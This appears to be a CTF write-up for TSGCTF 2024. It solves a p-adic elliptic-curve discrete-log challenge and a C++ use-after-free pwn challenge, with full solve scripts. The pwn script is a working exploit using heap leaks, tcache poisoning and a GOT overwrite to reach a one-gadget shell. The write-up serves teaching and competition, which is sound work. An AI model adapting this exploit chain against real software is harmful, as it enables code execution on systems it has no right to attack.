# TSGCTF 2024


@def maxtoclevel=2

\toc



## Easy(??) ECDLP (crypto)
In this challenge, we must solve 250 ECDLPs
over the field $\mathbb{Q}_p$ of $p$-adic numbers, where $p$ is a large prime chosen by us.
```python
#!/usr/bin/env sage
from flag import flag
import secrets
import sys

QUERY_NUM = 250
PREC = 8
PRIME_BITS = 200

p = int(input("Send your prime: "))

assert p.bit_length() >= PRIME_BITS and is_prime(p)

k = Qp(p,PREC)
R = k.integer_ring()
p = k(p)

def sage_encode(obj):
    from sage.misc.persist import SagePickler
    from base64 import b64encode
    return b64encode(SagePickler.dumps(obj)).decode('ascii')

for i in range(QUERY_NUM):
    while True:
        try:
            j = k.random_element()
            j *= p**(-j.valuation()+secrets.choice([-3,-2,-2]))
            ec = EllipticCurve_from_j(j)
            break
        except ArithmeticError:
            pass
    while True:
        try:
            g = k.random_element()
            P = ec.lift_x(g**2)
            secret = secrets.randbelow(int(2**(PRIME_BITS*PREC)))
            Q = secret*P
            break
        except ValueError:
            pass

    print(sage_encode(ec))
    print(sage_encode(P))
    print(sage_encode(Q))

    ans = int(input("Send your answer: "))
    if ans*P != Q:
        print("Wrong answer, bye...")
        sys.exit(1)

print(flag)
```

Let $E/\mathbb{Q}_p$ be an elliptic curve of the form
\begin{equation*}
y^2 = x^3 + ax + b, \quad a,b \in \mathbb{Q}_p 
\end{equation*} and let $P = (p_x, p_y)$, $Q = (q_x, q_y)$ be points of $E(\mathbb{Q}_p)$ such that $P = sQ$.

In most cases, there is a general algorithm for solving ECDLPs over $\mathbb{Q}_p$, given by [Masaya Yasuda (2012)](https://www.researchgate.net/profile/Masaya-Yasuda/publication/236009642_A_generalization_of_the_anomalous_attack_for_the_ECDLP_over_Q_p/links/0046352cb982bc0f21000000/A-generalization-of-the-anomalous-attack-for-the-ECDLP-over-Q-p.pdf), however that algorithm relies on the elliptic curve having a good reduction (i.e it does not reduce to a singular curve), which is not the case here. Instead, the server explicitly chooses $j$-invariants of negative valuation to force a bad reduction.

To solve this, we first transpose to an equivalent problem with strictly integer parameters by multiplying both sides of the equation by a sufficiently large power of $p$.
Specifically, let $X, Y, A, B \in \mathbb{Z}_{\geq 0}$ be the smallest non-negative integers such that
\begin{equation*}
2Y = 3X = A + X = B,
\end{equation*} and
\begin{align*}
    Y &\geq \mathrm{min}\left\{\nu_p(p_x), \nu_p(q_x)\right\}\\
    X &\geq \mathrm{min}\left\{\nu_p(p_y), \nu_p(q_y)\right\}\\
    A &\geq \nu_p(a)\\
    B &\geq \nu_p(b).
\end{align*}
Then multiplying both sides of $y^2 = x^3 + ax + b$ by $p^B$, we have
\begin{equation*}
    p^B(y^2) = p^B(x^3 + ax + b)
\end{equation*}or equivalently
\begin{equation*}
    (p^Yy)^2 = (p^Xx)^3 + p^{A+X}ax + p^Bb, 
\end{equation*}

and so the map
\begin{align*}
E\left(\mathbb{Q}_p, a, b\right) &\longrightarrow E\left(\mathbb{Z}_p, p^Aa, p^Bb\right)\\
(x, y) &\longmapsto (p^Xx, p^Yy)
\end{align*} is a homomorphism and respects the group operation.

From there, we can compose with the natural reduction
\begin{align*}
\mathbb{Z}_p &\longrightarrow \mathbb{F}_p\\ 
\sum_{k=0}^\infty c_kp^k &\longmapsto c_0
\end{align*} to get an ECDLP instance over $\mathbb{F}_p$, which we are more familiar with. 

Since the server chooses the elliptic curves to have a bad reduction, the resulting
curves will be singular when passed through this transformation. Depending on our luck, there are three possible cases here:

1. The singular curve has a cusp, in which case solving ECDLP over it is equivalent to solving DLP in the group $\mathbb{F}_p^{+}$, which is easy.
2. The singular curve has a node, and the gradients of the tangent to the curve at the singularity lie in $\mathbb{F}_p$, in which case solving ECDLP is equivalent to solving DLP in $\mathbb{F}_p^{\times}$, which is easy provided we choose $p$ such that $p-1$ is smooth.
3. The singular curve has a node, but the gradients of the tangent to the curve at the singularity lie in $\mathbb{F}_{p^2}$ and not $\mathbb{F}_p$. 

In the final case, the cardinality of the group is $p^2 - 1 = (p - 1)(p + 1)$,
and so one can hope to make DLP easy by finding a prime $p$ such that both $p - 1$ and $p + 1$ are smooth. 

Originally, I thought these primes would be impossible to find, but after some
digging I found a table of such "twin-smooth" integers in a Github repository for research conducted by [Costello et al. (2020)](https://github.com/microsoft/twin-smooth-integers/) at Microsoft. 

With our special prime in hand, we can now efficiently tackle all three cases of the
reduction. Below is an implementation of the solution in SageMath 
```python
#!/usr/bin/env python3
import secrets
from pwn import *
import base64

context.log_level = "debug"
from Crypto.Util.number import *


QUERY_NUM = 250
PREC = 8
PRIME_BITS = 200


# From https://github.com/microsoft/twin-smooth-integers/blob/main/pte_sieve/results/
p = 9355816148700659051640061440899400676699704943594616366140933205827791968821466084194144092358933402872320699667710483870980437363744475484988193779026749
k = Qp(p, PREC)
R = k.integer_ring()
p = k.prime()
Fp = GF(p)

def transfer_to_Zp(P, Q, ec):
    x_min = min(P[0], Q[0], key=lambda x: x.valuation())
    y_min = min(P[1], Q[1], key=lambda x: x.valuation())

    B = 0
    X = Y = A = -1

    def too_small(X, Y, A, B):
        return any(
            (
                X < abs(x_min.valuation()),
                Y < abs(y_min.valuation()),
                A < abs(ec.a4().valuation()),
                B < abs(ec.a6().valuation()),
            )
        )

    while too_small(X, Y, A, B):
        B += 6
        X = B // 3
        Y = B // 2
        A = B - X

    xp = Fp(P[0] * p ^ (X))
    yp = Fp(P[1] * p ^ (Y))
    xq = Fp(Q[0] * p ^ (X))
    yq = Fp(Q[1] * p ^ (Y))

    a = Fp(ec.a4() * p ** (A))
    b = Fp(ec.a6() * p ** (B))
    print("B =", B)
    assert yp ^ 2 == xp ^ 3 + a * xp + b
    return xp, yp, xq, yq, a, b


def singular_attack(xp, yp, xq, yq, a, b):
    FpX = PolynomialRing(Fp, "X")
    X = FpX.gen(0)
    f = X ^ 3 + a * X + b

    roots = f.roots()
    # Singular point is a cusp.
    if len(roots) == 1:
        print("Singular point is a cusp")
        alpha = roots[0][0]
        u = (xp - alpha) / yp
        v = (xq - alpha) / yq
        return int(v / u), u.order()

    # Singular point is a node.
    if len(roots) == 2:
        print("Singular point is a node")
        if roots[0][1] == 2:
            alpha = roots[0][0]
            beta = roots[1][0]
        elif roots[1][1] == 2:
            alpha = roots[1][0]
            beta = roots[0][0]
        else:
            raise ValueError("Expected root with multiplicity 2.")

        t = (alpha - beta).sqrt()
        u = (yp + t * (xp - alpha)) / (yp - t * (xp - alpha))
        v = (yq + t * (xq - alpha)) / (yq - t * (xq - alpha))

        return int(v.log(u, u.multiplicative_order())), u.multiplicative_order()


def proof_of_work(conn):
    proof = conn.recvline_startswith(b"Submit").decode()
    command = re.search(r"`(.*)`", proof).group(1)
    conn2 = process(command.split())
    response = conn2.recvall().decode()
    ans = response[len("hashcash stamp: ") :]
    conn.sendline(ans)


def sage_decode(obj):
    from sage.misc.persist import SageUnpickler
    from base64 import b64decode

    return SageUnpickler.loads(b64decode(obj))


def sage_encode(obj):
    from sage.misc.persist import SagePickler
    from base64 import b64encode

    return b64encode(SagePickler.dumps(obj)).decode("ascii")


def solve():
    # conn = process(["sage", "problem.sage"])
    conn = connect("34.146.145.253", 16180)
    proof_of_work(conn)
    conn.sendlineafter(b"Send your prime: ", str(p).encode())
    round = 0
    while True:
        ec = sage_decode(conn.recvline().decode())
        P = sage_decode(conn.recvline().decode())
        Q = sage_decode(conn.recvline().decode())

        curr_d = 0
        mult = 1
        while not Q.is_zero():
            xp, yp, xq, yq, a, b = transfer_to_Zp(P, Q, ec)
            print(f"a, b = {a}, {b}")
            print(f"xp, yp = {xp}, {yp}")
            print(f"xq, yq = {xq}, {yq}")
            d, order = singular_attack(xp, yp, xq, yq, a, b)
            # Shift to higher powers
            curr_d += d * mult
            mult *= order
            Q = Q - d * P
            P = order * P

        conn.sendlineafter(b"Send your answer: ", str(curr_d).encode())
        print("FINISHED", round)
        round += 1


if __name__ == "__main__":
    solve()
    # TSGCTF{BAD r3duCT1oN IS n0t 5o bAD!}
```


## FL Support Center (pwn)
In this challenge, we are given a C++ application which uses two `std::map<std::string, std::string>` maps to store contacts and messages.
```cpp
// g++ -o fl_support_center main.cpp
#include <iostream>
#include <limits>
#include <map>

#define MAX_CONTACT 2
#define MAX_SUPPORT_CONTACT 2

unsigned int contact = 0;
unsigned int support_contact = 0;

void add(std::map<std::string, std::string> &friends_list,
         std::map<std::string, std::string> &black_list) {
  std::string name;
  std::cout << "Name: ";
  std::cin >> name;

  if (auto it = black_list.find(name); it != black_list.end()) {
    if (black_list[name] != "") {
      std::cout << "Reported user" << std::endl;
      return;
    }
  }

  if (name.size() >= 0x100) {
    std::cout << "Too long" << std::endl;
  } else {
    friends_list[name] = "";
  }
  return;
}

void message(std::map<std::string, std::string> &friends_list) {
  std::string name;
  std::string message;

  contact++;
  if (contact > MAX_CONTACT) {
    std::cout << "The trial ends here." << std::endl;
    return;
  }

  std::cout << "Name: ";
  std::cin >> name;

  std::cout << "Message: ";
  std::cin >> message;

  if (message.size() >= 0x100) {
    std::cout << "Too long" << std::endl;
    return;
  }

  try {
    std::string old = friends_list.at(name);
    if (old != "") {
      std::string yon;
      std::cout << "Do you want to delete the sent message: " << old
                << "(yes or no)" << std::endl;
      std::cout << "> ";
      std::cin >> yon;
      if (yon == "yes") {
        friends_list.at(name) = message;
      }
    } else {
      friends_list.at(name) = message;
    }
  } catch (const std::out_of_range &ex) {
    std::cout << "Invalid Name" << std::endl;
  }
  return;
}

void list(std::map<std::string, std::string> &friends_list) {
  for (auto it : friends_list) {
    std::cout << "----------------------------------------------" << std::endl;
    std::cout << "Name: " << it.first << std::endl;
    std::cout << "Sent Message: " << it.second << std::endl;
  }
  std::cout << "----------------------------------------------" << std::endl;
  return;
}

void remove(std::map<std::string, std::string> &friends_list,
            std::map<std::string, std::string> &black_list) {
  std::string yon;
  std::string name;
  std::string message;
  std::cout << "Name: ";
  std::cin >> name;

  for (auto it = friends_list.begin(); it != friends_list.end();) {
    auto next = std::next(it);

    if (it->first == name) {
      if (it->first != "FL*Support*Center@fl.support.center") {
        friends_list.erase(it);
        if (auto it = black_list.find(name); it != black_list.end()) {
          std::cout << "Already blacklisted" << std::endl;
          std::cout << "Report: ";
          std::cin >> message;
          if (message.size() >= 0x100) {
            std::cout << "Too long" << std::endl;
          } else {
            black_list[name] = message;
          }
        } else {
          black_list[name] = "";
        }
      }

      if (it->first == "FL*Support*Center@fl.support.center") {
        support_contact++;
        if (contact > MAX_SUPPORT_CONTACT) {
          std::cout << "Too many contacts" << std::endl;
          return;
        }
        std::cout << "Thank you for contacting FL*Support*Center." << std::endl;
        std::cout << "Is there anything that didn't meet your expectations?"
                  << std::endl;
        std::cout << "Please let us know." << std::endl;

        if (it->second != "") {
          std::cout << "Do you want to delete the sent message: " << it->second
                    << "(yes or no)" << std::endl;
          std::cout << "> ";
          std::cin >> yon;
          if (yon != "yes") {
            break;
          }
        }

        std::cout << "Message: " << std::endl;
        std::cin >> message;
        if (message.size() >= 0x100) {
          std::cout << "Too long" << std::endl;
        } else {
          it->second = message;
        }
      }
    }
    it = next;
  }
  return;
}

int main() {
  int choice;
  std::map<std::string, std::string> friends_list = {
      {"FL*Support*Center@fl.support.center", ""}};
  std::map<std::string, std::string> black_list = {};

  while (1) {
    std::cout << "1. Add\n2. Message\n3. List\n4. Remove\n5. Exit" << std::endl;
    std::cout << "> ";
    std::cin >> choice;

    if (std::cin.eof()) {
      exit(0);
    }
    if (std::cin.fail()) {
      std::cout << "Invalid Option" << std::endl;
      std::cin.clear();
      std::cin.ignore(std::numeric_limits<std::streamsize>::max(), '\n');
      continue;
    }

    switch (choice) {
    case 1:
      add(friends_list, black_list);
      break;
    case 2:
      message(friends_list);
      break;
    case 3:
      list(friends_list);
      break;
    case 4:
      remove(friends_list, black_list);
      break;
    case 5:
      exit(0);

    default:
      std::cout << "Invalid Option" << std::endl;
      break;
    }
  }
  return 0;
}
```
The main bug lies in the `remove()` function. If we supply a name which exists in the map, then both the iterator `it` as well as the key `it->first` and value `it->second` will be freed upon reaching 
`friends_list.erase(it)`.
```cpp
if (it->first != "FL*Support*Center@fl.support.center") {
  friends_list.erase(it);
  if (auto it = black_list.find(name); it != black_list.end()) {
```
At this point, the iterator `it` is invalidated, and must not be dereferenced.
> Iterators, pointers and references referring to elements removed by the function invalidated. All other iterators, pointers and references keep their validity.
> [(`std::map::erase`)](https://cplusplus.com/reference/map/map/erase/)

however further down the function we read from `it->first` to compare its value against `"FL*Support*Center@fl.support.center"`.
```cpp
if (it->first == "FL*Support*Center@fl.support.center") {
  support_contact++;
  if (contact > MAX_SUPPORT_CONTACT) {
    std::cout << "Too many contacts" << std::endl;
    return;
  }
```
To exploit this, suppose the user we are removing has a name which is the same length as `"FL*Support*Center@fl.support.center"`, and further, suppose they have an existing blacklist entry. Such a user can be constructed by calling `add()`, then `remove()` then `add()` again on a single user. When this user's entry gets erased, the chunk holding the user's name will be freed. Since the user has a blacklist entry, we will then be asked to supply a report message.
```
if (auto it = black_list.find(name); it != black_list.end()) {
  std::cout << "Already blacklisted" << std::endl;
  std::cout << "Report: ";
  std::cin >> message;
  if (message.size() >= 0x100) {
    std::cout << "Too long" << std::endl;
  } else {
    black_list[name] = message;
  }
} else {
  black_list[name] = "";
}
```
If we supply the message `"FL*Support*Center@fl.support.center"`, then the chunk which previously held the user's name will be reallocated to store this message. Afterwards, both `message` and `it->first` will point to the same location, and both will have the value of the support user's name. With this, we can execute the support functionality while `it` is a deleted iterator. Usually this is not possible due to the guards
```cpp
if (it->first != "FL*Support*Center@fl.support.center") {
```
and
```cpp
if (it->first == "FL*Support*Center@fl.support.center") {
```
which ensure both are mutually exclusive, so we have managed to violate an invariant of the `remove()` function.

Looking further at what this gives us, we see that when `it` is an invalidated iterator, the support functionality in `remove()` makes two use-after-frees. The first occurs when the deleted user had a pre-existing message, in which case `it->second` is read and its contents are sent to the user. This can be used to leak heap and libc addresses.
```
if (it->second != "") {
  std::cout << "Do you want to delete the sent message: " << it->second
            << "(yes or no)" << std::endl;
  std::cout << "> ";
  std::cin >> yon;
  if (yon != "yes") {
    break;
  }
}
```
The second use-after-free occurs when a user supplied message is written directly to `it->second`. This gives us a write which we can use to corrupt heap pointers. 
```
std::cout << "Message: " << std::endl;
std::cin >> message;
if (message.size() >= 0x100) {
  std::cout << "Too long" << std::endl;
} else {
  it->second = message;
}
```

To exploit the leak, we can repeatedly call `add(), remove(), add(), remove()` to allocate and then free chunks into the tcache. Note that two iterations of `add()` and `remove()` are required to get a single chunk into the tcache, since on the first iteration, any `it->first` strings which are freed by `remove()` will be immediately reallocated to hold the key of the assignment
```cpp
} else {
  black_list[name] = "";
}
``` 
On the second iteration, the key already exists, and so will not need to be reallocated, leaving our freed `it->first` string in the tcache. Once the tcache is filled, we can use the main bug in `remove()` to obtain an iterator where `it->second` is a free chunk lying in the unsorted or smallbins list. From there, the read-after-free at
```cpp
std::cout << "Do you want to delete the sent message: " << it->second
<< "(yes or no)" << std::endl;
``` 
will leak both a libc address and a heap address.


To exploit the write, we can use the main bug to obtain an invalidated iterator `it` where `it->second` is freed and lies in the tcache. Then we can use the write-after-free to poison the tcache and write to an arbitrary location.

In practice, I found difficulty leveraging the write after the tcache was
poisoned. This is because almost every function in the program will
symmetrically call `malloc` on entry, and then `free` when variables fall out of
scope, leaving almost no cases where a poisoned tcache chunk (such as one
pointing to `__malloc_hook` or `__free_hook`) could be successfully malloced
without also being freed in the same function and causing an abort. 

Luckily, I found that during the process of the program aborting, libc makes a call to `strlen` inside of `__libc_message`. Hence we can leverage our tcache poisoning to corrupt the GOT entry for `strlen`, and then hijack execution to point to a one gadget which will give us a shell. 

Below is the full solve script
```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

context.terminal = "pwn-client.sh"
context.log_level = "debug"

exe = context.binary = ELF(args.EXE or "fl_support_center_patched")
libc = exe.libc


def start(argv=[], *a, **kw):
    """Start the exploit against the target."""
    if args.GDB:
        return gdb.debug([exe.path] + argv, api=True, gdbscript=gdbscript, *a, **kw)
    elif args.LOCAL:
        return process([exe.path] + argv, *a, **kw)
    else:
        return connect(args.HOST, args.PORT)


gdbscript = """
tbreak main
continue
""".format(
    **locals()
)


def close(conn):
    conn.close()
    if hasattr(conn, "gdb"):
        conn.gdb.quit()


def add(conn, name):
    conn.sendlineafter(b"> ", b"1")
    conn.sendlineafter(b"Name: ", name)


def message(conn, name, msg):
    conn.sendlineafter(b"> ", b"2")
    conn.sendlineafter(b"Name: ", name)
    conn.sendlineafter(b"Message: ", msg)
    line = conn.recvline()
    if b"delete the sent message" in line:
        conn.sendlineafter(b"> ", b"yes")


def protect_ptr(pos, ptr):
    return (pos >> 12) ^ ptr


def list_entries(conn):
    conn.sendlineafter(b"> ", b"3")
    conn.recvuntil(b"----------------------------------------------")
    conn.recvuntil(b"----------------------------------------------")


def remove(
    conn,
    name,
    yon=None,
    report=None,
    message=None,
):
    conn.sendlineafter(b"> ", b"4")
    conn.sendlineafter(b"Name: ", name)
    leak = None
    if not report is None:
        conn.sendlineafter(b"Report: ", report)
    if not yon is None:
        conn.recvuntil(b"Please let us know.\n")
        conn.recv(numb=len(b"Do you want to delete the send message: "))
        leak = conn.recv(numb=16)
        conn.sendlineafter(b"(yes or no)\n> ", yon)
    if not message is None:
        if isinstance(message, bytes):
            conn.sendlineafter(b"Message: ", message)
        else:
            conn.sendlineafter(b"Message: ", message(leak))
    return leak


SUPPORT_NAME = b"FL*Support*Center@fl.support.center"


def solve():
    conn = start()
    g = cyclic_gen(n=8)

    # Prepare first victim of main bug
    name = g.get(len(SUPPORT_NAME))
    add(conn, name)
    remove(conn, name)
    add(conn, name)
    message(conn, name, g.get(0xA0))

    # Fill up tcache
    names = []
    for _ in range(9):
        names.append(g.get(0xA0))
        add(conn, names[-1])
    for i in range(9):
        remove(conn, names[i])
    for i in range(9):
        add(conn, names[i])
    for i in range(8):
        remove(conn, names[i], report=g.get(1))

    # Now use first victim to read libc and heap address
    leak = remove(conn, name, yon=b"no", report=SUPPORT_NAME)
    heap_leak, libc_leak = u64(leak[:8]), u64(leak[8:])
    libc.address = libc_leak - 0x21ACE0
    exe.heap_base = heap_leak - 0x14A20
    print("LIBC LEAK", hex(libc_leak))
    print("HEAP LEAK", hex(heap_leak))
    print("LIBC BASE", hex(libc.address))
    print("HEAP BASE", hex(exe.heap_base))

    # Prepare second victim
    name = g.get(len(SUPPORT_NAME))
    add(conn, name)
    remove(conn, name)
    add(conn, name)

    # Make sure the 0x40 tcache is non-empty
    tcache_fill = g.get(0x40)
    add(conn, tcache_fill)
    remove(conn, tcache_fill)
    add(conn, tcache_fill)

    message(conn, name, g.get(0x40))
    remove(conn, tcache_fill, report=g.get(0x1))

    pos = exe.heap_base + 0x13710  # Address of the chunk who's fd pointer we're corrupting
    remove(
        conn,
        name,
        yon=b"yes",
        report=SUPPORT_NAME,
        message=fit(protect_ptr(pos, libc.address + 0x21A090), length=0x40),
    )

    # Overwrite GOT address with one gadget. Then trigger a free() abort.
    one_gadget = libc.address + 0xEBD38
    add(conn, fit({0x8: one_gadget}, length=0x40))
    add(conn, g.get(0x40))
    list_entries(conn)

    return conn


if __name__ == "__main__":
    conn = solve()
    conn.interactive()

```





